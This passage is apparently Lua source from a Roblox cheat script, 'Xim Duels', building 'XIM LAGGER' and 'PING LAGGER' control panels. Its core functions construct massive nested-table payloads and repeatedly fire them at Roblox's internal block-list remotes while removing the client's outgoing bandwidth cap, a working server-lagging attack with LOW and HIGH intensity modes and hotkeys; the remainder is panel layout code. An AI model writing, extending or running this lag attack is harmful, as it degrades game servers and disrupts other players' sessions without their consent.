                if M.customFontSelected ~= "None" then M._fontApplyOne(obj) end
            end)
        end
    else
        M._fontMy = nil
    end
    -- always persist selection
    pcall(function()
        if type(saveCherryConfig) == "function" then saveCherryConfig() end
    end)
end


-- XIM PING LAGGER

-- ============================================================
-- XIM LAGGER PANEL (lag-only, no crasher)
-- ============================================================
M.killLaggerOpen = M.killLaggerOpen == true
M.killLaggerLocked = M.killLaggerLocked == true
M.killLaggerKey = M.killLaggerKey or "V"
M.killLaggerActive = false
M.killLaggerGui = nil
M.killLaggerMain = nil
M._killLagThread = nil

local KILL_LAG_CONFIG = { TableIncrease = 1.5, Tries = 1, LoopWaitTime = 0.155 }

local function _vynxResolveBlockRemote()
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then return nil end
    for _, name in ipairs({"SetPlayerBlockList","UpdatePlayerBlockList","SetBlockList","UpdateBlockList"}) do
        local r = rrs:FindFirstChild(name)
        if r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent") or r:IsA("RemoteFunction")) then
            return r
        end
    end
    return nil
end

local function _vynxLagBomb()
    local tableincrease = KILL_LAG_CONFIG.TableIncrease
    local maintable, spammedtable = {}, {}
    table.insert(spammedtable, {})
    local z = spammedtable[1]
    for _ = 1, tableincrease do
        local n = {}
        table.insert(z, n)
        z = n
    end
    local maximum = 58500 / (tableincrease + 2)
    for i = 1, maximum do
        table.insert(maintable, spammedtable)
        if i % 5000 == 0 then task.wait() end
    end
    local remote = _vynxResolveBlockRemote()
    if not remote then return end
    for _ = 1, KILL_LAG_CONFIG.Tries do
        pcall(function()
            if remote:IsA("RemoteFunction") then
                remote:InvokeServer(maintable)
            else
                remote:FireServer(maintable)
            end
        end)
    end
end

function M.stopKillLagger()
    M.killLaggerActive = false
    if M._killLagThread then
        pcall(function() task.cancel(M._killLagThread) end)
        M._killLagThread = nil
    end
    if M._killLagRefresh then pcall(M._killLagRefresh) end
end

function M.startKillLagger()
    M.stopKillLagger()
    M.killLaggerActive = true
    M._killLagThread = task.spawn(function()
        while M.killLaggerActive do
            pcall(function()
                game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
            end)
            task.spawn(_vynxLagBomb)
            task.wait(KILL_LAG_CONFIG.LoopWaitTime)
        end
    end)
    if M._killLagRefresh then pcall(M._killLagRefresh) end
end

function M.toggleKillLagger()
    if M.killLaggerActive then M.stopKillLagger() else M.startKillLagger() end
end


-- ============================================================
-- XIM LAGGER PANEL (LOW / HIGH)
-- ============================================================
M.killLaggerMode = M.killLaggerMode or "LOW" -- LOW | HIGH
M.killLaggerOpen = M.killLaggerOpen == true
M.killLaggerLocked = M.killLaggerLocked == true
M.killLaggerMinimized = M.killLaggerMinimized == true
M.killLaggerPanelPos = M.killLaggerPanelPos
M.killLaggerKey = M.killLaggerKey or "V"
M.killLaggerActive = M.killLaggerActive == true
M.killLaggerGui = M.killLaggerGui
M.killLaggerMain = M.killLaggerMain
M._killLagThread = nil
M._killLagListening = false

local KL_HIGH = { TableIncrease = 265, Tries = 1, LoopWaitTime = 0.85 }
local KL_LOW  = { TableIncrease = 1.5, Tries = 1, LoopWaitTime = 0.155 }
local KL_REMOTE_PATH = "RobloxReplicatedStorage.SetPlayerBlockList"

local function _klPack(u)
    if typeof(u) ~= "UDim2" then return nil end
    return { sx = u.X.Scale, ox = u.X.Offset, sy = u.Y.Scale, oy = u.Y.Offset }
end
local function _klUnpack(t, fallback)
    if type(t) == "table" and type(t.sx) == "number" and type(t.sy) == "number" then
        return UDim2.new(t.sx, tonumber(t.ox) or 0, t.sy, tonumber(t.oy) or 0)
    end
    return fallback
end

local function _klResolveRemote(path)
    local obj = game
    local cleaned = path:gsub("^game%.", "")
    for segment in cleaned:gmatch("[^%.]+") do
        if not obj then return nil end
        obj = obj:FindFirstChild(segment) or obj[segment]
    end
    return obj
end

local function _klGetMax(val, isHigh)
    if isHigh then return 499999 / (val + 2) else return 58500 / (val + 2) end
end

local function _klBomb(tableincrease, tries, isHigh)
    local maintable, spammedtable = {}, {}
    table.insert(spammedtable, {})
    local z = spammedtable[1]
    for _ = 1, tableincrease do
        local tableins = {}
        table.insert(z, tableins)
        z = tableins
    end
    local maximum = _klGetMax(tableincrease, isHigh) or 9999999
    for i = 1, maximum do
        table.insert(maintable, spammedtable)
        if i % 5000 == 0 then task.wait() end
    end
    local remote = _klResolveRemote(KL_REMOTE_PATH)
    if not remote then
        local rrs = game:FindFirstChild("RobloxReplicatedStorage")
        if rrs then
            for _, name in ipairs({"SetPlayerBlockList","UpdatePlayerBlockList","SetBlockList","UpdateBlockList"}) do
                local r = rrs:FindFirstChild(name)
                if r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent") or r:IsA("RemoteFunction")) then
                    remote = r; break
                end
            end
        end
    end
    if not remote then return end
    for _ = 1, tries do
        pcall(function()
            if remote:IsA("RemoteFunction") then remote:InvokeServer(maintable)
            else remote:FireServer(maintable) end
        end)
    end
end

function M.stopKillLagger()
    M.killLaggerActive = false
    if M._killLagThread then pcall(function() task.cancel(M._killLagThread) end); M._killLagThread = nil end
    if M._killLagRefresh then pcall(M._killLagRefresh) end
end

function M.startKillLagger()
    M.stopKillLagger()
    M.killLaggerActive = true
    local cfg = (M.killLaggerMode == "HIGH") and KL_HIGH or KL_LOW
    local isHigh = M.killLaggerMode == "HIGH"
    M._killLagThread = task.spawn(function()
        while M.killLaggerActive do
            pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) end)
            task.spawn(function() _klBomb(cfg.TableIncrease, cfg.Tries, isHigh) end)
            task.wait(cfg.LoopWaitTime)
        end
    end)
    if M._killLagRefresh then pcall(M._killLagRefresh) end
end

function M.toggleKillLagger()
    if M.killLaggerActive then M.stopKillLagger() else M.startKillLagger() end
    pcall(saveCherryConfig)
end

function M.buildKillLaggerUI()
    if M.killLaggerGui and M.killLaggerGui.Parent then pcall(function() M.killLaggerGui:Destroy() end) end
    M.killLaggerGui = nil; M.killLaggerMain = nil

    local WHITE = Color3.fromRGB(255,255,255)
    local BLACK = Color3.fromRGB(0,0,0)
    local GREY2 = Color3.fromRGB(28,28,28)

    local gui = Instance.new("ScreenGui")
    gui.Name = "VynxLaggerGui"
    gui.ResetOnSpawn = false
    gui.DisplayOrder = 120
    gui.IgnoreGuiInset = true
    local okP = false
    pcall(function() if gethui then gui.Parent = gethui(); okP = true end end)
    if not okP then pcall(function() gui.Parent = game:GetService("CoreGui"); okP = true end) end
    if not okP then pcall(function() gui.Parent = player:WaitForChild("PlayerGui") end) end
    M.killLaggerGui = gui

    local MAIN_W, MAIN_H = 300, 150
    local main = Instance.new("Frame")
    main.Name = "VynxLaggerMain"
    main.Size = UDim2.new(0, MAIN_W, 0, MAIN_H)
    main.Position = _klUnpack(M.killLaggerPanelPos, UDim2.new(0.5, -MAIN_W/2, 0.15, 0))
    main.BackgroundColor3 = BLACK
    main.BackgroundTransparency = 1
    main.BorderSizePixel = 0
    main.Active = true
    main.ClipsDescendants = true
    main.Visible = M.killLaggerOpen == true
    main.Parent = gui
    Instance.new("UICorner", main).CornerRadius = UDim.new(0, 16)
    local mainStroke = Instance.new("UIStroke", main)
    mainStroke.Color = WHITE; mainStroke.Thickness = 1.2; mainStroke.Transparency = 0.55
    M.killLaggerMain = main

    -- black panel + white dots (no image)
    main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    main.BackgroundTransparency = 0
    pcall(function() M.applyPanelBackground(main, UDim.new(0, 16)) end)

    do
        local dragging, dragStart, startPos
        main.InputBegan:Connect(function(i)
            if M.killLaggerLocked then return end
            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
                dragging = true; dragStart = i.Position; startPos = main.Position
                i.Changed:Connect(function()
                    if i.UserInputState == Enum.UserInputState.End then
                        dragging = false
                        M.killLaggerPanelPos = _klPack(main.Position)
                        pcall(saveCherryConfig)
                    end
                end)
            end
        end)
        UIS.InputChanged:Connect(function(i)
            if M.killLaggerLocked then dragging = false; return end
            if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
                local d = i.Position - dragStart
                main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
            end
        end)
    end

    local title = Instance.new("TextLabel", main)
    title.Size = UDim2.new(1,-120,0,16); title.Position = UDim2.new(0,14,0,8)
    title.BackgroundTransparency = 1; title.Text = "XIM LAGGER"; title.TextColor3 = WHITE
    title.Font = Enum.Font.GothamBold; title.TextSize = 13; title.TextXAlignment = Enum.TextXAlignment.Left; title.ZIndex = 5

    local discordTag = Instance.new("TextLabel", main)
    discordTag.Size = UDim2.new(1,-120,0,12); discordTag.Position = UDim2.new(0,14,0,24)
    discordTag.BackgroundTransparency = 1; discordTag.Text = "xim duels"; discordTag.TextColor3 = WHITE
    discordTag.Font = Enum.Font.GothamBold; discordTag.TextSize = 10; discordTag.TextXAlignment = Enum.TextXAlignment.Left; discordTag.ZIndex = 5

    local body = Instance.new("Frame", main)
    body.Name = "LaggerBody"; body.BackgroundTransparency = 1
    body.Size = UDim2.new(1,0,1,-42); body.Position = UDim2.new(0,0,0,42); body.ZIndex = 3

    local function mkIconBtn(xOff, txt, w)
        local b = Instance.new("TextButton", main)
        b.Size = UDim2.new(0, w or 28, 0, 26); b.Position = UDim2.new(1, xOff, 0, 10)
        b.BackgroundColor3 = GREY2; b.BorderSizePixel = 0; b.Text = txt; b.TextColor3 = WHITE
        b.Font = Enum.Font.GothamBold; b.TextSize = 14; b.AutoButtonColor = false; b.ZIndex = 6
        Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)
        local st = Instance.new("UIStroke", b); st.Color = WHITE; st.Thickness = 1; st.Transparency = 0.65
        return b
    end

    local lockBtn = mkIconBtn(-96, "LOCK", 30)
    local minBtn = mkIconBtn(-64, "-", 28)
    local closeBtn = mkIconBtn(-32, "X", 28)
    lockBtn.TextSize = 9; minBtn.TextSize = 16; closeBtn.TextSize = 13

    local function refreshLock()
        if M.killLaggerLocked then
            lockBtn.Text = "UNLOCK"; lockBtn.BackgroundColor3 = WHITE; lockBtn.TextColor3 = BLACK
            lockBtn.Size = UDim2.new(0,44,0,26); lockBtn.Position = UDim2.new(1,-110,0,10)
        else
            lockBtn.Text = "LOCK"; lockBtn.BackgroundColor3 = GREY2; lockBtn.TextColor3 = WHITE
            lockBtn.Size = UDim2.new(0,30,0,26); lockBtn.Position = UDim2.new(1,-96,0,10)
        end
    end
    lockBtn.MouseButton1Click:Connect(function() M.killLaggerLocked = not M.killLaggerLocked; refreshLock(); pcall(saveCherryConfig) end)
    refreshLock()

    local function applyMinimize(on)
        M.killLaggerMinimized = on and true or false
        body.Visible = not M.killLaggerMinimized
        if M.killLaggerMinimized then main.Size = UDim2.new(0,MAIN_W,0,42); minBtn.Text = "+"
        else main.Size = UDim2.new(0,MAIN_W,0,MAIN_H); minBtn.Text = "-" end
    end
    minBtn.MouseButton1Click:Connect(function() applyMinimize(not M.killLaggerMinimized) end)
    closeBtn.MouseButton1Click:Connect(function()
        M.setKillLaggerPanelOpen(false)
    end)

    local modeRow = Instance.new("Frame", body)
    modeRow.BackgroundTransparency = 1; modeRow.Size = UDim2.new(1,-24,0,30); modeRow.Position = UDim2.new(0,12,0,4); modeRow.ZIndex = 4
    local modeLow = Instance.new("TextButton", modeRow)
    modeLow.Size = UDim2.new(0.5,-4,1,0); modeLow.Position = UDim2.new(0,0,0,0)
    modeLow.BackgroundColor3 = GREY2; modeLow.BorderSizePixel = 0; modeLow.Text = "LOW"; modeLow.TextColor3 = WHITE
    modeLow.Font = Enum.Font.GothamBold; modeLow.TextSize = 12; modeLow.AutoButtonColor = false; modeLow.ZIndex = 5
    Instance.new("UICorner", modeLow).CornerRadius = UDim.new(0, 8)
    local modeHigh = Instance.new("TextButton", modeRow)
    modeHigh.Size = UDim2.new(0.5,-4,1,0); modeHigh.Position = UDim2.new(0.5,4,0,0)
    modeHigh.BackgroundColor3 = GREY2; modeHigh.BorderSizePixel = 0; modeHigh.Text = "HIGH"; modeHigh.TextColor3 = WHITE
    modeHigh.Font = Enum.Font.GothamBold; modeHigh.TextSize = 12; modeHigh.AutoButtonColor = false; modeHigh.ZIndex = 5
    Instance.new("UICorner", modeHigh).CornerRadius = UDim.new(0, 8)

    local function refreshMode()
        local isLow = M.killLaggerMode == "LOW"
        modeLow.BackgroundColor3 = isLow and WHITE or GREY2; modeLow.TextColor3 = isLow and BLACK or WHITE
        modeHigh.BackgroundColor3 = (not isLow) and WHITE or GREY2; modeHigh.TextColor3 = (not isLow) and BLACK or WHITE
    end
    modeLow.MouseButton1Click:Connect(function()
        local was = M.killLaggerActive; if was then M.stopKillLagger() end
        M.killLaggerMode = "LOW"; refreshMode(); if was then M.startKillLagger() end; pcall(saveCherryConfig)
    end)
    modeHigh.MouseButton1Click:Connect(function()
        local was = M.killLaggerActive; if was then M.stopKillLagger() end
        M.killLaggerMode = "HIGH"; refreshMode(); if was then M.startKillLagger() end; pcall(saveCherryConfig)
    end)

    local row = Instance.new("Frame", body)
    row.BackgroundColor3 = Color3.fromRGB(12,12,12); row.BackgroundTransparency = 0.45; row.BorderSizePixel = 0
    row.Size = UDim2.new(1,-24,0,48); row.Position = UDim2.new(0,12,0,42); row.ZIndex = 4
    Instance.new("UICorner", row).CornerRadius = UDim.new(0, 10)

    local statusLbl = Instance.new("TextLabel", row)
    statusLbl.Size = UDim2.new(0,50,1,0); statusLbl.Position = UDim2.new(0,12,0,0)
    statusLbl.BackgroundTransparency = 1; statusLbl.Text = "OFF"; statusLbl.TextColor3 = WHITE
    statusLbl.Font = Enum.Font.GothamBold; statusLbl.TextSize = 14; statusLbl.TextXAlignment = Enum.TextXAlignment.Left; statusLbl.ZIndex = 5

    local kbBtn = Instance.new("TextButton", row)
    kbBtn.Size = UDim2.new(0,56,0,26); kbBtn.Position = UDim2.new(0,70,0.5,-13)
    kbBtn.BackgroundColor3 = GREY2; kbBtn.BorderSizePixel = 0
    kbBtn.Text = tostring(M.killLaggerKey or "V"); kbBtn.TextColor3 = WHITE
    kbBtn.Font = Enum.Font.GothamBold; kbBtn.TextSize = 12; kbBtn.AutoButtonColor = false; kbBtn.ZIndex = 5
    Instance.new("UICorner", kbBtn).CornerRadius = UDim.new(0, 8)
    local kbStroke = Instance.new("UIStroke", kbBtn); kbStroke.Color = WHITE; kbStroke.Thickness = 1; kbStroke.Transparency = 0.65

    local toggleBtn = Instance.new("TextButton", row)
    toggleBtn.Size = UDim2.new(0,72,0,28); toggleBtn.Position = UDim2.new(1,-84,0.5,-14)
    toggleBtn.BackgroundColor3 = GREY2; toggleBtn.BorderSizePixel = 0; toggleBtn.Text = "OFF"; toggleBtn.TextColor3 = WHITE
    toggleBtn.Font = Enum.Font.GothamBold; toggleBtn.TextSize = 13; toggleBtn.AutoButtonColor = false; toggleBtn.ZIndex = 5
    Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(0, 8)
    local togStroke = Instance.new("UIStroke", toggleBtn); togStroke.Color = WHITE; togStroke.Thickness = 1; togStroke.Transparency = 0.55

    local function refreshVisual()
        local on = M.killLaggerActive == true
        statusLbl.Text = on and "ON" or "OFF"
        toggleBtn.Text = on and "ON" or "OFF"
        toggleBtn.BackgroundColor3 = on and WHITE or GREY2
        toggleBtn.TextColor3 = on and BLACK or WHITE
        togStroke.Transparency = on and 0.15 or 0.55
        mainStroke.Transparency = on and 0.3 or 0.55
        if not M._killLagListening then kbBtn.Text = tostring(M.killLaggerKey or "V") end
    end
    M._killLagRefresh = refreshVisual

    toggleBtn.MouseButton1Click:Connect(function() M.toggleKillLagger() end)
    kbBtn.MouseButton1Click:Connect(function()
        if M._killLagListening then return end
        M._killLagListening = true; kbBtn.Text = "..."; kbStroke.Transparency = 0.2
        local conn
        conn = UIS.InputBegan:Connect(function(inp, gpe)
            if gpe then return end
            if inp.UserInputType == Enum.UserInputType.Keyboard and inp.KeyCode ~= Enum.KeyCode.Unknown then
                M.killLaggerKey = inp.KeyCode.Name; kbBtn.Text = inp.KeyCode.Name
                M._killLagListening = false; kbStroke.Transparency = 0.65
                pcall(function() conn:Disconnect() end); pcall(saveCherryConfig)
            end
        end)
    end)

    if M._killLagKeyConn then pcall(function() M._killLagKeyConn:Disconnect() end) end
    M._killLagKeyConn = UIS.InputBegan:Connect(function(inp, gpe)
        if gpe or M._killLagListening then return end
        if inp.UserInputType ~= Enum.UserInputType.Keyboard then return end
        if M.killLaggerKey and inp.KeyCode.Name == M.killLaggerKey and M.killLaggerOpen then
            M.toggleKillLagger()
        end
    end)

    refreshMode(); refreshVisual(); applyMinimize(M.killLaggerMinimized)
end

function M.setKillLaggerPanelOpen(on)
    M.killLaggerOpen = on and true or false
    if M.killLaggerOpen then
        if not M.killLaggerGui or not M.killLaggerGui.Parent then M.buildKillLaggerUI() end
        if M.killLaggerMain then M.killLaggerMain.Visible = true end
    else
        M.stopKillLagger()
        if M.killLaggerMain then M.killLaggerMain.Visible = false end
    end
    if M.setKillLaggerPanelVisual then pcall(function() M.setKillLaggerPanelVisual(M.killLaggerOpen) end) end
    pcall(saveCherryConfig)
end


function M.getPanelBgImage()
    return nil -- no background images; black + white dots only
end

function M.applyPanelBackground(parent, cornerRadius)
    if not parent then return end
    for _, n in ipairs({"PanelBg", "PanelBgOverlay", "DotPattern", "PanelDotPattern", "CustomBgImage"}) do
        local old = parent:FindFirstChild(n)
        if old then pcall(function() old:Destroy() end) end
    end
    -- Solid black panel base
    pcall(function()
        parent.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        parent.BackgroundTransparency = 0
    end)
    local cr = 16
    if typeof(cornerRadius) == "UDim" then
        cr = cornerRadius.Offset or 16
    elseif type(cornerRadius) == "number" then
        cr = cornerRadius
    end
    -- Dense white dots (puntini)
    local dots = Instance.new("Frame")
    dots.Name = "PanelDotPattern"
    dots.BackgroundTransparency = 1
    dots.Size = UDim2.fromScale(1, 1)
    dots.ZIndex = 0
    dots.ClipsDescendants = true
    dots.Parent = parent
    Instance.new("UICorner", dots).CornerRadius = UDim.new(0, cr)
    local rng = Random.new(91)
    for i = 1, 140 do
        local d = Instance.new("Frame")
        d.Name = "Dot"
        local sz = rng:NextNumber(0.5, 1.8)
        d.Size = UDim2.new(0, sz, 0, sz)
        d.Position = UDim2.new(rng:NextNumber(0.005, 0.995), 0, rng:NextNumber(0.005, 0.995), 0)
        d.AnchorPoint = Vector2.new(0.5, 0.5)
        d.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        d.BackgroundTransparency = rng:NextNumber(0.40, 0.90)
        d.BorderSizePixel = 0
        d.ZIndex = 0
        d.Parent = dots
        Instance.new("UICorner", d).CornerRadius = UDim.new(1, 0)
    end
end

function M.setPanelBgImageId(id)

    id = tonumber(id) or 123407376197646
    if id <= 0 then id = 123407376197646 end
    M.panelBgImageId = id
    pcall(function()
        if M.pingMain then M.applyPanelBackground(M.pingMain, UDim.new(0, 16)) end
        if M.killLaggerMain then M.applyPanelBackground(M.killLaggerMain, UDim.new(0, 16)) end
        if M.aadMain then M.applyPanelBackground(M.aadMain, UDim.new(0, 16)) end
    end)
    pcall(saveCherryConfig)
end

function M.findPingRemote()
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then return nil end
    local remote
    for _, name in ipairs({"SetPlayerBlockList","UpdatePlayerBlockList","SetBlockList","UpdateBlockList"}) do
        local r = rrs:FindFirstChild(name)
        if r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent") or r:IsA("RemoteFunction")) then
            remote = r; break
        end
    end
    if not remote then
        for _, c in ipairs(rrs:GetChildren()) do
            if (c:IsA("RemoteEvent") or c:IsA("UnreliableRemoteEvent") or c:IsA("RemoteFunction")) and c.Name:find("Block") then
                remote = c; break
            end
        end
    end
    return remote
end

-- ===== ORIGINAL PING LAGGER payload (Galaxy-style) =====
function M.buildPingPayload(power)
    local main = {}
    local nested = {{}}
    local current = nested[1]
    for _ = 1, 186 do
        local n = {}
        table.insert(current, n)
        current = n
    end
    local maxRep = math.min(math.floor((tonumber(power) or 100000) / 188), 10000)
    for _ = 1, maxRep do
        table.insert(main, nested)
    end
    return main
end

function M.runPingLoop()
    if M.pingLoopRunning then return end
    M.pingLoopRunning = true
    local delay = tonumber(M.pingInterval) or 0.125
    while M.pingActive and M.pingPanelOpen and M.pingRemote do
        local payload = M.buildPingPayload(M.pingPower)
        local ok = pcall(function()
            if M.pingRemote:IsA("RemoteFunction") then
                M.pingRemote:InvokeServer(payload)
            else
                M.pingRemote:FireServer(payload)
            end
        end)
        if not ok then
            delay = math.min(delay * 1.5, 0.5)
        else
            delay = math.max(delay * 0.995, 0.05)
        end
        task.wait(delay)
    end
    M.pingLoopRunning = false
end

function M.setPingActive(state, isManual)
    -- Ping ONLY runs when Xim Ping Lagger panel is open
    if state and not M.pingPanelOpen then
        M.pingActive = false
        if M._pingRefreshVisual then pcall(M._pingRefreshVisual) end
        return
    end
    M.pingActive = state and true or false
    if isManual then
        if M.pingBrainrotMode then
            M.pingManualOverride = not state
        else
            M.pingManualOverride = false
        end
    end
    if M.pingActive then
        if not M.pingRemote then
            M.pingRemote = M.findPingRemote()
            if not M.pingRemote then
                M.pingActive = false
            end
        end
        if M.pingActive and not M.pingLoopRunning then
            task.spawn(M.runPingLoop)
        end
    end
    if M._pingRefreshVisual then
        pcall(M._pingRefreshVisual)
    end
end

function M.buildPingLaggerUI()
    if M.pingGui and M.pingGui.Parent then
        pcall(function() M.pingGui:Destroy() end)
    end
    M.pingGui = nil
    M.pingMain = nil
    M.pingSettings = nil

    local WHITE = Color3.fromRGB(255, 255, 255)
    local BLACK = Color3.fromRGB(0, 0, 0)
    local CARD  = Color3.fromRGB(18, 18, 18)
    local GREEN = Color3.fromRGB(255, 255, 255)
    local RED_SOFT = Color3.fromRGB(220, 220, 220)

    local gui = Instance.new("ScreenGui")
    gui.Name = "VynxPingLaggerGui"
    gui.ResetOnSpawn = false
    gui.DisplayOrder = 18
    gui.IgnoreGuiInset = true
    local okParent = false
    if gethui then okParent = pcall(function() gui.Parent = gethui() end) end
    if not okParent then
        pcall(function() gui.Parent = player:WaitForChild("PlayerGui") end)
    end
    M.pingGui = gui

    -- Pure black panel + white dots (no background image)
    local MAIN_W, MAIN_H = 320, 118
    local main = Instance.new("Frame")
    main.Name = "VynxPingLaggerMain"
    main.Size = UDim2.new(0, MAIN_W, 0, MAIN_H)
    main.Position = _unpackUDim2(M.pingPanelPos, UDim2.new(0.5, -MAIN_W/2, 0.2, 0))
    main.BackgroundColor3 = BLACK
    main.BackgroundTransparency = 0
    main.BorderSizePixel = 0
    main.Active = true
    main.ClipsDescendants = true
    main.Visible = M.pingPanelOpen == true
    main.Parent = gui
    Instance.new("UICorner", main).CornerRadius = UDim.new(0, 16)
    local mainStroke = Instance.new("UIStroke", main)
    mainStroke.Color = WHITE
    mainStroke.Thickness = 1
    mainStroke.Transparency = 0.55
    M.pingMain = main

    -- black + many white dots (puntini)
    pcall(function()
        if M.applyPanelBackground then
            M.applyPanelBackground(main, UDim.new(0, 16))
        else
            local dots = Instance.new("Frame")
            dots.Name = "PanelDotPattern"
            dots.BackgroundTransparency = 1
            dots.Size = UDim2.fromScale(1, 1)
            dots.ZIndex = 0
            dots.ClipsDescendants = true
            dots.Parent = main
            Instance.new("UICorner", dots).CornerRadius = UDim.new(0, 16)
            local rng = Random.new(91)
            for i = 1, 120 do
                local d = Instance.new("Frame")
                d.Name = "Dot"
                local sz = rng:NextNumber(0.45, 2.2)
                d.Size = UDim2.new(0, sz, 0, sz)
                d.Position = UDim2.new(rng:NextNumber(0.005, 0.995), 0, rng:NextNumber(0.005, 0.995), 0)
                d.AnchorPoint = Vector2.new(0.5, 0.5)
                d.BackgroundColor3 = WHITE
                d.BackgroundTransparency = rng:NextNumber(0.40, 0.90)
                d.BorderSizePixel = 0
                d.ZIndex = 0
                d.Parent = dots
                Instance.new("UICorner", d).CornerRadius = UDim.new(1, 0)
            end
        end
    end)

    -- drag (blocked when M.pingLocked) + save position
    do
        local dragging, dragStart, startPos
        main.InputBegan:Connect(function(i)
            if M.pingLocked then return end
            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
                dragging = true; dragStart = i.Position; startPos = main.Position
                i.Changed:Connect(function()
                    if i.UserInputState == Enum.UserInputState.End then
                        dragging = false
                        M.pingPanelPos = _packUDim2(main.Position)
                        pcall(function() if saveCherryConfig then saveCherryConfig() end end)
                    end
                end)
            end
        end)
        UIS.InputChanged:Connect(function(i)
            if M.pingLocked then dragging = false; return end
            if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
                local d = i.Position - dragStart
                main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
            end
        end)
    end

    -- Top header row
    local header = Instance.new("Frame", main)
    header.Size = UDim2.new(1, -16, 0, 36)
    header.Position = UDim2.new(0, 8, 0, 6)
    header.BackgroundTransparency = 1
    header.ZIndex = 3

    local gearBtn = Instance.new("TextButton", header)
    gearBtn.Size = UDim2.new(0, 28, 0, 28)
    gearBtn.Position = UDim2.new(0, 0, 0.5, -14)
    gearBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    gearBtn.BorderSizePixel = 0
    gearBtn.Text = "SET"
    gearBtn.TextColor3 = WHITE
    gearBtn.Font = Enum.Font.GothamBold
    gearBtn.TextSize = 10
    gearBtn.AutoButtonColor = false
    gearBtn.ZIndex = 4
    Instance.new("UICorner", gearBtn).CornerRadius = UDim.new(1, 0)

    local titleCol = Instance.new("Frame", header)
    titleCol.Size = UDim2.new(0, 120, 1, 0)
    titleCol.Position = UDim2.new(0, 34, 0, 0)
    titleCol.BackgroundTransparency = 1
    titleCol.ZIndex = 4

    local title = Instance.new("TextLabel", titleCol)
    title.Size = UDim2.new(1, 0, 0, 18)
    title.Position = UDim2.new(0, 0, 0, 2)
    title.BackgroundTransparency = 1
    title.Text = "Xim Duels"
    title.TextColor3 = WHITE
    title.Font = Enum.Font.GothamBlack
    title.TextSize = 13
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.ZIndex = 4

    local sub = Instance.new("TextLabel", titleCol)
    sub.Size = UDim2.new(1, 0, 0, 14)
    sub.Position = UDim2.new(0, 0, 0, 18)
    sub.BackgroundTransparency = 1
    sub.Text = "PING LAGGER"
    sub.TextColor3 = Color3.fromRGB(160, 160, 160)
    sub.Font = Enum.Font.GothamBold
    sub.TextSize = 9
    sub.TextXAlignment = Enum.TextXAlignment.Left
    sub.ZIndex = 4

    if M.pingLocked == nil then M.pingLocked = false end

    local lockBtn = Instance.new("TextButton", header)
    lockBtn.Name = "PingLockBtn"
    lockBtn.Size = UDim2.new(0, 40, 0, 24)
    lockBtn.Position = UDim2.new(1, -134, 0.5, -12)
    lockBtn.BackgroundColor3 = M.pingLocked and WHITE or Color3.fromRGB(28, 28, 28)
    lockBtn.BorderSizePixel = 0
    lockBtn.Text = M.pingLocked and "LOCK" or "MOVE"
    lockBtn.TextColor3 = M.pingLocked and BLACK or WHITE
    lockBtn.Font = Enum.Font.GothamBlack
    lockBtn.TextSize = 9
    lockBtn.AutoButtonColor = false
    lockBtn.ZIndex = 5
    Instance.new("UICorner", lockBtn).CornerRadius = UDim.new(1, 0)
    local lockStroke = Instance.new("UIStroke", lockBtn)
    lockStroke.Color = WHITE
    lockStroke.Thickness = 1
    lockStroke.Transparency = M.pingLocked and 0.2 or 0.65

    local function refreshPingLockVisual()
        local locked = M.pingLocked == true
        lockBtn.Text = locked and "LOCK" or "MOVE"
        lockBtn.BackgroundColor3 = locked and WHITE or Color3.fromRGB(28, 28, 28)
        lockBtn.TextColor3 = locked and BLACK or WHITE
        lockStroke.Transparency = locked and 0.2 or 0.65
    end
    M._pingRefreshLockVisual = refreshPingLockVisual

    lockBtn.MouseButton1Click:Connect(function()
        M.pingLocked = not M.pingLocked
        refreshPingLockVisual()
        pcall(function() if saveCherryConfig then saveCherryConfig() end end)
    end)

    local statusPill = Instance.new("Frame", header)
    statusPill.Size = UDim2.new(0, 58, 0, 24)
    statusPill.Position = UDim2.new(1, -90, 0.5, -12)
    statusPill.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
    statusPill.BorderSizePixel = 0
    statusPill.ZIndex = 4
    Instance.new("UICorner", statusPill).CornerRadius = UDim.new(1, 0)
    local statusLbl = Instance.new("TextLabel", statusPill)
    statusLbl.Size = UDim2.new(1, 0, 1, 0)
    statusLbl.BackgroundTransparency = 1
    statusLbl.Text = M.pingActive and "ON" or "READY"
    statusLbl.TextColor3 = BLACK
    statusLbl.Font = Enum.Font.GothamBlack
    statusLbl.TextSize = 10
    statusLbl.ZIndex = 5

    local closeBtn = Instance.new("TextButton", header)
    closeBtn.Size = UDim2.new(0, 26, 0, 26)
    closeBtn.Position = UDim2.new(1, -28, 0.5, -13)
    closeBtn.BackgroundTransparency = 1
    closeBtn.Text = "X"
    closeBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.TextSize = 14
    closeBtn.ZIndex = 5
    closeBtn.AutoButtonColor = false
    closeBtn.MouseButton1Click:Connect(function()
        M.setPingPanelOpen(false)
    end)

    -- Bottom action row
    local row = Instance.new("Frame", main)
    row.Size = UDim2.new(1, -16, 0, 52)
    row.Position = UDim2.new(0, 8, 0, 48)
    row.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
    row.BackgroundTransparency = 0.55
